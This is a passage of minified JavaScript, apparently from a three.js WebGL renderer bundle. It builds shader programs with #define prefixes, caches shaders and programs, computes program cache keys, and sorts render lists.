	precision ${t.precision} usampler2DArray;
	`;return t.precision==="highp"?e+=`
#define HIGH_PRECISION`:t.precision==="mediump"?e+=`
#define MEDIUM_PRECISION`:t.precision==="lowp"&&(e+=`
#define LOW_PRECISION`),e}const uA={[nl]:"SHADOWMAP_TYPE_PCF",[ca]:"SHADOWMAP_TYPE_VSM"};function dA(t){return uA[t.shadowMapType]||"SHADOWMAP_TYPE_BASIC"}const pA={[Fs]:"ENVMAP_TYPE_CUBE",[Nr]:"ENVMAP_TYPE_CUBE",[ec]:"ENVMAP_TYPE_CUBE_UV"};function hA(t){return t.envMap===!1?"ENVMAP_TYPE_CUBE":pA[t.envMapMode]||"ENVMAP_TYPE_CUBE"}const fA={[Nr]:"ENVMAP_MODE_REFRACTION"};function mA(t){return t.envMap===!1?"ENVMAP_MODE_REFLECTION":fA[t.envMapMode]||"ENVMAP_MODE_REFLECTION"}const gA={[b0]:"ENVMAP_BLENDING_MULTIPLY",[ew]:"ENVMAP_BLENDING_MIX",[tw]:"ENVMAP_BLENDING_ADD"};function vA(t){return t.envMap===!1?"ENVMAP_BLENDING_NONE":gA[t.combine]||"ENVMAP_BLENDING_NONE"}function _A(t){const e=t.envMapCubeUVHeight;if(e===null)return null;const n=Math.log2(e)-2,i=1/e;return{texelWidth:1/(3*Math.max(Math.pow(2,n),7*16)),texelHeight:i,maxMip:n}}function xA(t,e,n,i){const s=t.getContext(),r=n.defines;let a=n.vertexShader,o=n.fragmentShader;const l=dA(n),c=hA(n),p=mA(n),d=vA(n),h=_A(n),f=nA(n),v=iA(r),y=s.createProgram();let m,u,g=n.glslVersion?"#version "+n.glslVersion+`
`:"";n.isRawShaderMaterial?(m=["#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,v].filter(da).join(`
`),m.length>0&&(m+=`
`),u=["#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,v].filter(da).join(`
`),u.length>0&&(u+=`
`)):(m=[Fm(n),"#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,v,n.extensionClipCullDistance?"#define USE_CLIP_DISTANCE":"",n.batching?"#define USE_BATCHING":"",n.batchingColor?"#define USE_BATCHING_COLOR":"",n.instancing?"#define USE_INSTANCING":"",n.instancingColor?"#define USE_INSTANCING_COLOR":"",n.instancingMorph?"#define USE_INSTANCING_MORPH":"",n.useFog&&n.fog?"#define USE_FOG":"",n.useFog&&n.fogExp2?"#define FOG_EXP2":"",n.map?"#define USE_MAP":"",n.envMap?"#define USE_ENVMAP":"",n.envMap?"#define "+p:"",n.lightMap?"#define USE_LIGHTMAP":"",n.aoMap?"#define USE_AOMAP":"",n.bumpMap?"#define USE_BUMPMAP":"",n.normalMap?"#define USE_NORMALMAP":"",n.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",n.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",n.displacementMap?"#define USE_DISPLACEMENTMAP":"",n.emissiveMap?"#define USE_EMISSIVEMAP":"",n.anisotropy?"#define USE_ANISOTROPY":"",n.anisotropyMap?"#define USE_ANISOTROPYMAP":"",n.clearcoatMap?"#define USE_CLEARCOATMAP":"",n.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",n.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",n.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",n.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",n.specularMap?"#define USE_SPECULARMAP":"",n.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",n.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",n.roughnessMap?"#define USE_ROUGHNESSMAP":"",n.metalnessMap?"#define USE_METALNESSMAP":"",n.alphaMap?"#define USE_ALPHAMAP":"",n.alphaHash?"#define USE_ALPHAHASH":"",n.transmission?"#define USE_TRANSMISSION":"",n.transmissionMap?"#define USE_TRANSMISSIONMAP":"",n.thicknessMap?"#define USE_THICKNESSMAP":"",n.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",n.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",n.mapUv?"#define MAP_UV "+n.mapUv:"",n.alphaMapUv?"#define ALPHAMAP_UV "+n.alphaMapUv:"",n.lightMapUv?"#define LIGHTMAP_UV "+n.lightMapUv:"",n.aoMapUv?"#define AOMAP_UV "+n.aoMapUv:"",n.emissiveMapUv?"#define EMISSIVEMAP_UV "+n.emissiveMapUv:"",n.bumpMapUv?"#define BUMPMAP_UV "+n.bumpMapUv:"",n.normalMapUv?"#define NORMALMAP_UV "+n.normalMapUv:"",n.displacementMapUv?"#define DISPLACEMENTMAP_UV "+n.displacementMapUv:"",n.metalnessMapUv?"#define METALNESSMAP_UV "+n.metalnessMapUv:"",n.roughnessMapUv?"#define ROUGHNESSMAP_UV "+n.roughnessMapUv:"",n.anisotropyMapUv?"#define ANISOTROPYMAP_UV "+n.anisotropyMapUv:"",n.clearcoatMapUv?"#define CLEARCOATMAP_UV "+n.clearcoatMapUv:"",n.clearcoatNormalMapUv?"#define CLEARCOAT_NORMALMAP_UV "+n.clearcoatNormalMapUv:"",n.clearcoatRoughnessMapUv?"#define CLEARCOAT_ROUGHNESSMAP_UV "+n.clearcoatRoughnessMapUv:"",n.iridescenceMapUv?"#define IRIDESCENCEMAP_UV "+n.iridescenceMapUv:"",n.iridescenceThicknessMapUv?"#define IRIDESCENCE_THICKNESSMAP_UV "+n.iridescenceThicknessMapUv:"",n.sheenColorMapUv?"#define SHEEN_COLORMAP_UV "+n.sheenColorMapUv:"",n.sheenRoughnessMapUv?"#define SHEEN_ROUGHNESSMAP_UV "+n.sheenRoughnessMapUv:"",n.specularMapUv?"#define SPECULARMAP_UV "+n.specularMapUv:"",n.specularColorMapUv?"#define SPECULAR_COLORMAP_UV "+n.specularColorMapUv:"",n.specularIntensityMapUv?"#define SPECULAR_INTENSITYMAP_UV "+n.specularIntensityMapUv:"",n.transmissionMapUv?"#define TRANSMISSIONMAP_UV "+n.transmissionMapUv:"",n.thicknessMapUv?"#define THICKNESSMAP_UV "+n.thicknessMapUv:"",n.vertexTangents&&n.flatShading===!1?"#define USE_TANGENT":"",n.vertexColors?"#define USE_COLOR":"",n.vertexAlphas?"#define USE_COLOR_ALPHA":"",n.vertexUv1s?"#define USE_UV1":"",n.vertexUv2s?"#define USE_UV2":"",n.vertexUv3s?"#define USE_UV3":"",n.pointsUvs?"#define USE_POINTS_UV":"",n.flatShading?"#define FLAT_SHADED":"",n.skinning?"#define USE_SKINNING":"",n.morphTargets?"#define USE_MORPHTARGETS":"",n.morphNormals&&n.flatShading===!1?"#define USE_MORPHNORMALS":"",n.morphColors?"#define USE_MORPHCOLORS":"",n.morphTargetsCount>0?"#define MORPHTARGETS_TEXTURE_STRIDE "+n.morphTextureStride:"",n.morphTargetsCount>0?"#define MORPHTARGETS_COUNT "+n.morphTargetsCount:"",n.doubleSided?"#define DOUBLE_SIDED":"",n.flipSided?"#define FLIP_SIDED":"",n.shadowMapEnabled?"#define USE_SHADOWMAP":"",n.shadowMapEnabled?"#define "+l:"",n.sizeAttenuation?"#define USE_SIZEATTENUATION":"",n.numLightProbes>0?"#define USE_LIGHT_PROBES":"",n.logarithmicDepthBuffer?"#define USE_LOGARITHMIC_DEPTH_BUFFER":"",n.reversedDepthBuffer?"#define USE_REVERSED_DEPTH_BUFFER":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;","#ifdef USE_INSTANCING","	attribute mat4 instanceMatrix;","#endif","#ifdef USE_INSTANCING_COLOR","	attribute vec3 instanceColor;","#endif","#ifdef USE_INSTANCING_MORPH","	uniform sampler2D morphTexture;","#endif","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","#ifdef USE_UV1","	attribute vec2 uv1;","#endif","#ifdef USE_UV2","	attribute vec2 uv2;","#endif","#ifdef USE_UV3","	attribute vec2 uv3;","#endif","#ifdef USE_TANGENT","	attribute vec4 tangent;","#endif","#if defined( USE_COLOR_ALPHA )","	attribute vec4 color;","#elif defined( USE_COLOR )","	attribute vec3 color;","#endif","#ifdef USE_SKINNING","	attribute vec4 skinIndex;","	attribute vec4 skinWeight;","#endif",`
`].filter(da).join(`
`),u=[Fm(n),"#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,v,n.useFog&&n.fog?"#define USE_FOG":"",n.useFog&&n.fogExp2?"#define FOG_EXP2":"",n.alphaToCoverage?"#define ALPHA_TO_COVERAGE":"",n.map?"#define USE_MAP":"",n.matcap?"#define USE_MATCAP":"",n.envMap?"#define USE_ENVMAP":"",n.envMap?"#define "+c:"",n.envMap?"#define "+p:"",n.envMap?"#define "+d:"",h?"#define CUBEUV_TEXEL_WIDTH "+h.texelWidth:"",h?"#define CUBEUV_TEXEL_HEIGHT "+h.texelHeight:"",h?"#define CUBEUV_MAX_MIP "+h.maxMip+".0":"",n.lightMap?"#define USE_LIGHTMAP":"",n.aoMap?"#define USE_AOMAP":"",n.bumpMap?"#define USE_BUMPMAP":"",n.normalMap?"#define USE_NORMALMAP":"",n.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",n.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",n.emissiveMap?"#define USE_EMISSIVEMAP":"",n.anisotropy?"#define USE_ANISOTROPY":"",n.anisotropyMap?"#define USE_ANISOTROPYMAP":"",n.clearcoat?"#define USE_CLEARCOAT":"",n.clearcoatMap?"#define USE_CLEARCOATMAP":"",n.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",n.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",n.dispersion?"#define USE_DISPERSION":"",n.iridescence?"#define USE_IRIDESCENCE":"",n.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",n.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",n.specularMap?"#define USE_SPECULARMAP":"",n.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",n.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",n.roughnessMap?"#define USE_ROUGHNESSMAP":"",n.metalnessMap?"#define USE_METALNESSMAP":"",n.alphaMap?"#define USE_ALPHAMAP":"",n.alphaTest?"#define USE_ALPHATEST":"",n.alphaHash?"#define USE_ALPHAHASH":"",n.sheen?"#define USE_SHEEN":"",n.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",n.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",n.transmission?"#define USE_TRANSMISSION":"",n.transmissionMap?"#define USE_TRANSMISSIONMAP":"",n.thicknessMap?"#define USE_THICKNESSMAP":"",n.vertexTangents&&n.flatShading===!1?"#define USE_TANGENT":"",n.vertexColors||n.instancingColor||n.batchingColor?"#define USE_COLOR":"",n.vertexAlphas?"#define USE_COLOR_ALPHA":"",n.vertexUv1s?"#define USE_UV1":"",n.vertexUv2s?"#define USE_UV2":"",n.vertexUv3s?"#define USE_UV3":"",n.pointsUvs?"#define USE_POINTS_UV":"",n.gradientMap?"#define USE_GRADIENTMAP":"",n.flatShading?"#define FLAT_SHADED":"",n.doubleSided?"#define DOUBLE_SIDED":"",n.flipSided?"#define FLIP_SIDED":"",n.shadowMapEnabled?"#define USE_SHADOWMAP":"",n.shadowMapEnabled?"#define "+l:"",n.premultipliedAlpha?"#define PREMULTIPLIED_ALPHA":"",n.numLightProbes>0?"#define USE_LIGHT_PROBES":"",n.decodeVideoTexture?"#define DECODE_VIDEO_TEXTURE":"",n.decodeVideoTextureEmissive?"#define DECODE_VIDEO_TEXTURE_EMISSIVE":"",n.logarithmicDepthBuffer?"#define USE_LOGARITHMIC_DEPTH_BUFFER":"",n.reversedDepthBuffer?"#define USE_REVERSED_DEPTH_BUFFER":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;",n.toneMapping!==ai?"#define TONE_MAPPING":"",n.toneMapping!==ai?Oe.tonemapping_pars_fragment:"",n.toneMapping!==ai?eA("toneMapping",n.toneMapping):"",n.dithering?"#define DITHERING":"",n.opaque?"#define OPAQUE":"",Oe.colorspace_pars_fragment,JT("linearToOutputTexel",n.outputColorSpace),tA(),n.useDepthPacking?"#define DEPTH_PACKING "+n.depthPacking:"",`
`].filter(da).join(`
`)),a=tp(a),a=Dm(a,n),a=Um(a,n),o=tp(o),o=Dm(o,n),o=Um(o,n),a=Om(a),o=Om(o),n.isRawShaderMaterial!==!0&&(g=`#version 300 es
`,m=[f,"#define attribute in","#define varying out","#define texture2D texture"].join(`
`)+`
`+m,u=["#define varying in",n.glslVersion===Jf?"":"layout(location = 0) out highp vec4 pc_fragColor;",n.glslVersion===Jf?"":"#define gl_FragColor pc_fragColor","#define gl_FragDepthEXT gl_FragDepth","#define texture2D texture","#define textureCube texture","#define texture2DProj textureProj","#define texture2DLodEXT textureLod","#define texture2DProjLodEXT textureProjLod","#define textureCubeLodEXT textureLod","#define texture2DGradEXT textureGrad","#define texture2DProjGradEXT textureProjGrad","#define textureCubeGradEXT textureGrad"].join(`
`)+`
`+u);const _=g+m+a,b=g+u+o,T=Lm(s,s.VERTEX_SHADER,_),A=Lm(s,s.FRAGMENT_SHADER,b);s.attachShader(y,T),s.attachShader(y,A),n.index0AttributeName!==void 0?s.bindAttribLocation(y,0,n.index0AttributeName):n.morphTargets===!0&&s.bindAttribLocation(y,0,"position"),s.linkProgram(y);function C(P){if(t.debug.checkShaderErrors){const G=s.getProgramInfoLog(y)||"",V=s.getShaderInfoLog(T)||"",Z=s.getShaderInfoLog(A)||"",O=G.trim(),z=V.trim(),F=Z.trim();let I=!0,X=!0;if(s.getProgramParameter(y,s.LINK_STATUS)===!1)if(I=!1,typeof t.debug.onShaderError=="function")t.debug.onShaderError(s,y,T,A);else{const K=Im(s,T,"vertex"),ne=Im(s,A,"fragment");$e("THREE.WebGLProgram: Shader Error "+s.getError()+" - VALIDATE_STATUS "+s.getProgramParameter(y,s.VALIDATE_STATUS)+`

Material Name: `+P.name+`
Material Type: `+P.type+`

Program Info Log: `+O+`
`+K+`
`+ne)}else O!==""?Ie("WebGLProgram: Program Info Log:",O):(z===""||F==="")&&(X=!1);X&&(P.diagnostics={runnable:I,programLog:O,vertexShader:{log:z,prefix:m},fragmentShader:{log:F,prefix:u}})}s.deleteShader(T),s.deleteShader(A),L=new ol(s,y),w=sA(s,y)}let L;this.getUniforms=function(){return L===void 0&&C(this),L};let w;this.getAttributes=function(){return w===void 0&&C(this),w};let E=n.rendererExtensionParallelShaderCompile===!1;return this.isReady=function(){return E===!1&&(E=s.getProgramParameter(y,YT)),E},this.destroy=function(){i.releaseStatesOfProgram(this),s.deleteProgram(y),this.program=void 0},this.type=n.shaderType,this.name=n.shaderName,this.id=$T++,this.cacheKey=e,this.usedTimes=1,this.program=y,this.vertexShader=T,this.fragmentShader=A,this}let yA=0;class SA{constructor(){this.shaderCache=new Map,this.materialCache=new Map}update(e){const n=e.vertexShader,i=e.fragmentShader,s=this._getShaderStage(n),r=this._getShaderStage(i),a=this._getShaderCacheForMaterial(e);return a.has(s)===!1&&(a.add(s),s.usedTimes++),a.has(r)===!1&&(a.add(r),r.usedTimes++),this}remove(e){const n=this.materialCache.get(e);for(const i of n)i.usedTimes--,i.usedTimes===0&&this.shaderCache.delete(i.code);return this.materialCache.delete(e),this}getVertexShaderID(e){return this._getShaderStage(e.vertexShader).id}getFragmentShaderID(e){return this._getShaderStage(e.fragmentShader).id}dispose(){this.shaderCache.clear(),this.materialCache.clear()}_getShaderCacheForMaterial(e){const n=this.materialCache;let i=n.get(e);return i===void 0&&(i=new Set,n.set(e,i)),i}_getShaderStage(e){const n=this.shaderCache;let i=n.get(e);return i===void 0&&(i=new bA(e),n.set(e,i)),i}}class bA{constructor(e){this.id=yA++,this.code=e,this.usedTimes=0}}function wA(t,e,n,i,s,r,a){const o=new V0,l=new SA,c=new Set,p=[],d=new Map,h=s.logarithmicDepthBuffer;let f=s.precision;const v={MeshDepthMaterial:"depth",MeshDistanceMaterial:"distance",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",MeshToonMaterial:"toon",MeshStandardMaterial:"physical",MeshPhysicalMaterial:"physical",MeshMatcapMaterial:"matcap",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointsMaterial:"points",ShadowMaterial:"shadow",SpriteMaterial:"sprite"};function y(w){return c.add(w),w===0?"uv":`uv${w}`}function m(w,E,P,G,V){const Z=G.fog,O=V.geometry,z=w.isMeshStandardMaterial?G.environment:null,F=(w.isMeshStandardMaterial?n:e).get(w.envMap||z),I=F&&F.mapping===ec?F.image.height:null,X=v[w.type];w.precision!==null&&(f=s.getMaxPrecision(w.precision),f!==w.precision&&Ie("WebGLProgram.getParameters:",w.precision,"not supported, using",f,"instead."));const K=O.morphAttributes.position||O.morphAttributes.normal||O.morphAttributes.color,ne=K!==void 0?K.length:0;let ye=0;O.morphAttributes.position!==void 0&&(ye=1),O.morphAttributes.normal!==void 0&&(ye=2),O.morphAttributes.color!==void 0&&(ye=3);let Le,Ke,Qe,Y;if(X){const tt=ei[X];Le=tt.vertexShader,Ke=tt.fragmentShader}else Le=w.vertexShader,Ke=w.fragmentShader,l.update(w),Qe=l.getVertexShaderID(w),Y=l.getFragmentShaderID(w);const te=t.getRenderTarget(),_e=t.state.buffers.depth.getReversed(),De=V.isInstancedMesh===!0,be=V.isBatchedMesh===!0,qe=!!w.map,Nt=!!w.matcap,Ge=!!F,et=!!w.aoMap,at=!!w.lightMap,Fe=!!w.bumpMap,Et=!!w.normalMap,k=!!w.displacementMap,Mt=!!w.emissiveMap,Je=!!w.metalnessMap,lt=!!w.roughnessMap,Ee=w.anisotropy>0,R=w.clearcoat>0,x=w.dispersion>0,D=w.iridescence>0,$=w.sheen>0,ee=w.transmission>0,q=Ee&&!!w.anisotropyMap,Te=R&&!!w.clearcoatMap,le=R&&!!w.clearcoatNormalMap,we=R&&!!w.clearcoatRoughnessMap,ke=D&&!!w.iridescenceMap,re=D&&!!w.iridescenceThicknessMap,ue=$&&!!w.sheenColorMap,Se=$&&!!w.sheenRoughnessMap,Me=!!w.specularMap,ce=!!w.specularColorMap,Be=!!w.specularIntensityMap,N=ee&&!!w.transmissionMap,fe=ee&&!!w.thicknessMap,ae=!!w.gradientMap,me=!!w.alphaMap,ie=w.alphaTest>0,J=!!w.alphaHash,oe=!!w.extensions;let Ne=ai;w.toneMapped&&(te===null||te.isXRRenderTarget===!0)&&(Ne=t.toneMapping);const ct={shaderID:X,shaderType:w.type,shaderName:w.name,vertexShader:Le,fragmentShader:Ke,defines:w.defines,customVertexShaderID:Qe,customFragmentShaderID:Y,isRawShaderMaterial:w.isRawShaderMaterial===!0,glslVersion:w.glslVersion,precision:f,batching:be,batchingColor:be&&V._colorsTexture!==null,instancing:De,instancingColor:De&&V.instanceColor!==null,instancingMorph:De&&V.morphTexture!==null,outputColorSpace:te===null?t.outputColorSpace:te.isXRRenderTarget===!0?te.texture.colorSpace:Dr,alphaToCoverage:!!w.alphaToCoverage,map:qe,matcap:Nt,envMap:Ge,envMapMode:Ge&&F.mapping,envMapCubeUVHeight:I,aoMap:et,lightMap:at,bumpMap:Fe,normalMap:Et,displacementMap:k,emissiveMap:Mt,normalMapObjectSpace:Et&&w.normalMapType===sw,normalMapTangentSpace:Et&&w.normalMapType===F0,metalnessMap:Je,roughnessMap:lt,anisotropy:Ee,anisotropyMap:q,clearcoat:R,clearcoatMap:Te,clearcoatNormalMap:le,clearcoatRoughnessMap:we,dispersion:x,iridescence:D,iridescenceMap:ke,iridescenceThicknessMap:re,sheen:$,sheenColorMap:ue,sheenRoughnessMap:Se,specularMap:Me,specularColorMap:ce,specularIntensityMap:Be,transmission:ee,transmissionMap:N,thicknessMap:fe,gradientMap:ae,opaque:w.transparent===!1&&w.blending===wr&&w.alphaToCoverage===!1,alphaMap:me,alphaTest:ie,alphaHash:J,combine:w.combine,mapUv:qe&&y(w.map.channel),aoMapUv:et&&y(w.aoMap.channel),lightMapUv:at&&y(w.lightMap.channel),bumpMapUv:Fe&&y(w.bumpMap.channel),normalMapUv:Et&&y(w.normalMap.channel),displacementMapUv:k&&y(w.displacementMap.channel),emissiveMapUv:Mt&&y(w.emissiveMap.channel),metalnessMapUv:Je&&y(w.metalnessMap.channel),roughnessMapUv:lt&&y(w.roughnessMap.channel),anisotropyMapUv:q&&y(w.anisotropyMap.channel),clearcoatMapUv:Te&&y(w.clearcoatMap.channel),clearcoatNormalMapUv:le&&y(w.clearcoatNormalMap.channel),clearcoatRoughnessMapUv:we&&y(w.clearcoatRoughnessMap.channel),iridescenceMapUv:ke&&y(w.iridescenceMap.channel),iridescenceThicknessMapUv:re&&y(w.iridescenceThicknessMap.channel),sheenColorMapUv:ue&&y(w.sheenColorMap.channel),sheenRoughnessMapUv:Se&&y(w.sheenRoughnessMap.channel),specularMapUv:Me&&y(w.specularMap.channel),specularColorMapUv:ce&&y(w.specularColorMap.channel),specularIntensityMapUv:Be&&y(w.specularIntensityMap.channel),transmissionMapUv:N&&y(w.transmissionMap.channel),thicknessMapUv:fe&&y(w.thicknessMap.channel),alphaMapUv:me&&y(w.alphaMap.channel),vertexTangents:!!O.attributes.tangent&&(Et||Ee),vertexColors:w.vertexColors,vertexAlphas:w.vertexColors===!0&&!!O.attributes.color&&O.attributes.color.itemSize===4,pointsUvs:V.isPoints===!0&&!!O.attributes.uv&&(qe||me),fog:!!Z,useFog:w.fog===!0,fogExp2:!!Z&&Z.isFogExp2,flatShading:w.flatShading===!0&&w.wireframe===!1,sizeAttenuation:w.sizeAttenuation===!0,logarithmicDepthBuffer:h,reversedDepthBuffer:_e,skinning:V.isSkinnedMesh===!0,morphTargets:O.morphAttributes.position!==void 0,morphNormals:O.morphAttributes.normal!==void 0,morphColors:O.morphAttributes.color!==void 0,morphTargetsCount:ne,morphTextureStride:ye,numDirLights:E.directional.length,numPointLights:E.point.length,numSpotLights:E.spot.length,numSpotLightMaps:E.spotLightMap.length,numRectAreaLights:E.rectArea.length,numHemiLights:E.hemi.length,numDirLightShadows:E.directionalShadowMap.length,numPointLightShadows:E.pointShadowMap.length,numSpotLightShadows:E.spotShadowMap.length,numSpotLightShadowsWithMaps:E.numSpotLightShadowsWithMaps,numLightProbes:E.numLightProbes,numClippingPlanes:a.numPlanes,numClipIntersection:a.numIntersection,dithering:w.dithering,shadowMapEnabled:t.shadowMap.enabled&&P.length>0,shadowMapType:t.shadowMap.type,toneMapping:Ne,decodeVideoTexture:qe&&w.map.isVideoTexture===!0&&We.getTransfer(w.map.colorSpace)===it,decodeVideoTextureEmissive:Mt&&w.emissiveMap.isVideoTexture===!0&&We.getTransfer(w.emissiveMap.colorSpace)===it,premultipliedAlpha:w.premultipliedAlpha,doubleSided:w.side===yi,flipSided:w.side===hn,useDepthPacking:w.depthPacking>=0,depthPacking:w.depthPacking||0,index0AttributeName:w.index0AttributeName,extensionClipCullDistance:oe&&w.extensions.clipCullDistance===!0&&i.has("WEBGL_clip_cull_distance"),extensionMultiDraw:(oe&&w.extensions.multiDraw===!0||be)&&i.has("WEBGL_multi_draw"),rendererExtensionParallelShaderCompile:i.has("KHR_parallel_shader_compile"),customProgramCacheKey:w.customProgramCacheKey()};return ct.vertexUv1s=c.has(1),ct.vertexUv2s=c.has(2),ct.vertexUv3s=c.has(3),c.clear(),ct}function u(w){const E=[];if(w.shaderID?E.push(w.shaderID):(E.push(w.customVertexShaderID),E.push(w.customFragmentShaderID)),w.defines!==void 0)for(const P in w.defines)E.push(P),E.push(w.defines[P]);return w.isRawShaderMaterial===!1&&(g(E,w),_(E,w),E.push(t.outputColorSpace)),E.push(w.customProgramCacheKey),E.join()}function g(w,E){w.push(E.precision),w.push(E.outputColorSpace),w.push(E.envMapMode),w.push(E.envMapCubeUVHeight),w.push(E.mapUv),w.push(E.alphaMapUv),w.push(E.lightMapUv),w.push(E.aoMapUv),w.push(E.bumpMapUv),w.push(E.normalMapUv),w.push(E.displacementMapUv),w.push(E.emissiveMapUv),w.push(E.metalnessMapUv),w.push(E.roughnessMapUv),w.push(E.anisotropyMapUv),w.push(E.clearcoatMapUv),w.push(E.clearcoatNormalMapUv),w.push(E.clearcoatRoughnessMapUv),w.push(E.iridescenceMapUv),w.push(E.iridescenceThicknessMapUv),w.push(E.sheenColorMapUv),w.push(E.sheenRoughnessMapUv),w.push(E.specularMapUv),w.push(E.specularColorMapUv),w.push(E.specularIntensityMapUv),w.push(E.transmissionMapUv),w.push(E.thicknessMapUv),w.push(E.combine),w.push(E.fogExp2),w.push(E.sizeAttenuation),w.push(E.morphTargetsCount),w.push(E.morphAttributeCount),w.push(E.numDirLights),w.push(E.numPointLights),w.push(E.numSpotLights),w.push(E.numSpotLightMaps),w.push(E.numHemiLights),w.push(E.numRectAreaLights),w.push(E.numDirLightShadows),w.push(E.numPointLightShadows),w.push(E.numSpotLightShadows),w.push(E.numSpotLightShadowsWithMaps),w.push(E.numLightProbes),w.push(E.shadowMapType),w.push(E.toneMapping),w.push(E.numClippingPlanes),w.push(E.numClipIntersection),w.push(E.depthPacking)}function _(w,E){o.disableAll(),E.instancing&&o.enable(0),E.instancingColor&&o.enable(1),E.instancingMorph&&o.enable(2),E.matcap&&o.enable(3),E.envMap&&o.enable(4),E.normalMapObjectSpace&&o.enable(5),E.normalMapTangentSpace&&o.enable(6),E.clearcoat&&o.enable(7),E.iridescence&&o.enable(8),E.alphaTest&&o.enable(9),E.vertexColors&&o.enable(10),E.vertexAlphas&&o.enable(11),E.vertexUv1s&&o.enable(12),E.vertexUv2s&&o.enable(13),E.vertexUv3s&&o.enable(14),E.vertexTangents&&o.enable(15),E.anisotropy&&o.enable(16),E.alphaHash&&o.enable(17),E.batching&&o.enable(18),E.dispersion&&o.enable(19),E.batchingColor&&o.enable(20),E.gradientMap&&o.enable(21),w.push(o.mask),o.disableAll(),E.fog&&o.enable(0),E.useFog&&o.enable(1),E.flatShading&&o.enable(2),E.logarithmicDepthBuffer&&o.enable(3),E.reversedDepthBuffer&&o.enable(4),E.skinning&&o.enable(5),E.morphTargets&&o.enable(6),E.morphNormals&&o.enable(7),E.morphColors&&o.enable(8),E.premultipliedAlpha&&o.enable(9),E.shadowMapEnabled&&o.enable(10),E.doubleSided&&o.enable(11),E.flipSided&&o.enable(12),E.useDepthPacking&&o.enable(13),E.dithering&&o.enable(14),E.transmission&&o.enable(15),E.sheen&&o.enable(16),E.opaque&&o.enable(17),E.pointsUvs&&o.enable(18),E.decodeVideoTexture&&o.enable(19),E.decodeVideoTextureEmissive&&o.enable(20),E.alphaToCoverage&&o.enable(21),w.push(o.mask)}function b(w){const E=v[w.type];let P;if(E){const G=ei[E];P=Nw.clone(G.uniforms)}else P=w.uniforms;return P}function T(w,E){let P=d.get(E);return P!==void 0?++P.usedTimes:(P=new xA(t,E,w,r),p.push(P),d.set(E,P)),P}function A(w){if(--w.usedTimes===0){const E=p.indexOf(w);p[E]=p[p.length-1],p.pop(),d.delete(w.cacheKey),w.destroy()}}function C(w){l.remove(w)}function L(){l.dispose()}return{getParameters:m,getProgramCacheKey:u,getUniforms:b,acquireProgram:T,releaseProgram:A,releaseShaderCache:C,programs:p,dispose:L}}function EA(){let t=new WeakMap;function e(a){return t.has(a)}function n(a){let o=t.get(a);return o===void 0&&(o={},t.set(a,o)),o}function i(a){t.delete(a)}function s(a,o,l){t.get(a)[o]=l}function r(){t=new WeakMap}return{has:e,get:n,remove:i,update:s,dispose:r}}function MA(t,e){return t.groupOrder!==e.groupOrder?t.groupOrder-e.groupOrder:t.renderOrder!==e.renderOrder?t.renderOrder-e.renderOrder:t.material.id!==e.material.id?t.material.id-e.material.id:t.z!==e.z?t.z-e.z:t.id-e.id}function Bm(t,e){return t.groupOrder!==e.groupOrder?t.groupOrder-e.groupOrder:t.renderOrder!==e.renderOrder?t.renderOrder-e.renderOrder:t.z!==e.z?e.z-t.z:t.id-e.id}function zm(){const t=[];let e=0;const n=[],i=[],s=[];function r(){e=0,n.length=0,i.length=0,s.length=0}function a(d,h,f,v,y,m){let u=t[e];return u===void 0?(u={id:d.id,object:d,geometry:h,material:f,groupOrder:v,renderOrder:d.renderOrder,z:y,group:m},t[e]=u):(u.id=d.id,u.object=d,u.geometry=h,u.material=f,u.groupOrder=v,u.renderOrder=d.renderOrder,u.z=y,u.group=m),e++,u}function o(d,h,f,v,y,m){const u=a(d,h,f,v,y,m);f.transmission>0?i.push(u):f.transparent===!0?s.push(u):n.push(u)}function l(d,h,f,v,y,m){const u=a(d,h,f,v,y,m);f.transmission>0?i.unshift(u):f.transparent===!0?s.unshift(u):n.unshift(u)}function c(d,h){n.length>1&&n.sort(d||MA),i.length>1&&i.sort(h||Bm),s.length>1&&s.sort(h||Bm)}function p(){for(let d=e,h=t.length;d<h;d++){const f=t[d];if(f.id===null)break;f.id=null,f.object=null,f.geometry=null,f.material=null,f.group=null}}return{opaque:n,transmissive:i,transparent:s,init:r,push:o,unshift:l,finish:p,sort:c}}function TA(){let t=new WeakMap;function e(i,s){const r=t.get(i);let a;return r===void 0?(a=new zm,t.set(i,[a])):s>=r.length?(a=new zm,r.push(a)):a=r[s],a}function n(){t=new WeakMap}return{get:e,dispose:n}}function AA(){const t={};return{get:function(e){if(t[e.id]!==void 0)return t[e.id];let n;switch(e.type){case"DirectionalLight":n={direction:new H,color:new je};break;case"SpotLight":n={position:new 